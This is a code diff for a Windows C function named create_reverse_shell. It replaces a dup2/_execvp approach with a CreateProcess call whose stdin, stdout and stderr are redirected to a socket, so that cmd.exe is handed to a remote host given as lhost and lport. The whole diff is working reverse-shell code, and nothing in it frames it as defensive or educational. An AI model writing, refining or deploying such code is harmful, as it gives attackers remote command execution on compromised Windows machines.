@@ -36,15 +36,53 @@ void create_reverse_shell(const char *lhost, int lport) {
         return;
     }
 
-    // Redirect standard input/output/error to the socket
-    dup2((int)sock, 0);  // stdin
-    dup2((int)sock, 1);  // stdout
-    dup2((int)sock, 2);  // stderr
+    // Create process information for executing cmd.exe
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
 
-    // Execute the command shell (cmd.exe)
-    _execvp("cmd.exe", NULL);
+    // Redirect standard input, output, and error to the socket
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    HANDLE hStdin = (HANDLE)sock;
+    HANDLE hStdout = (HANDLE)sock;
+    HANDLE hStderr = (HANDLE)sock;
+
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = hStdin;
+    si.hStdOutput = hStdout;
+    si.hStdError = hStderr;
+
+    // Start cmd.exe and redirect I/O to the socket
+    if (!CreateProcess(
+        NULL,                   // No module name (use command line)
+        "cmd.exe",              // Command to execute
+        NULL,                   // Process security attributes
+        NULL,                   // Primary thread security attributes
+        TRUE,                   // Inherit handles
+        0,                      // No creation flags
+        NULL,                   // Use parent's environment
+        NULL,                   // Use parent's current directory
+        &si,                    // STARTUPINFO pointer
+        &pi                     // PROCESS_INFORMATION pointer
+    )) {
+        printf("CreateProcess failed\n");
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Wait for the process to finish
+    WaitForSingleObject(pi.hProcess, INFINITE);
 
     // Cleanup
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
     closesocket(sock);
     WSACleanup();
 }
